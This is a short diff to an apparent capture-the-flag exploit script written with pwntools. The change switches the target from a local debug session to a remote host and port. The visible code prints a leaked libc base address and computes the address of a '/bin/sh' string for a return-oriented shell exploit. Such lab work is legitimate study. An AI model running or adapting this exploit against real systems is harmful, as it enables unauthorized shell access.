@@ -2,8 +2,8 @@ from pwn import *
 
 gdbscript = "b main\nb *main+261\nc"
 
-with gdb.debug("./chal1", gdbscript=gdbscript) as conn:
-#with remote("54.193.31.133", 13000) as conn:
+#with gdb.debug("./chal1", gdbscript=gdbscript) as conn:
+with remote("54.193.31.133", 13000) as conn:
     # Input any name
     print(conn.recvline())
     conn.sendline(b"asdf")
@@ -29,7 +29,7 @@ with gdb.debug("./chal1", gdbscript=gdbscript) as conn:
     print(f"libc_base_addr {hex(libc_base_addr)}")
 
     print(conn.recvline())
-    # We use the `grep "/bin/sh\\x00` command in GDB with GEF to search
+    # We use the `grep "/bin/sh\\x00"` command in GDB with GEF to search
     # for an address in libc that has a "/bin/sh" string.
     binsh_addr = libc_base_addr + 1934968
     # The set rdi ROP gadget is found using the ROPgadget tool.
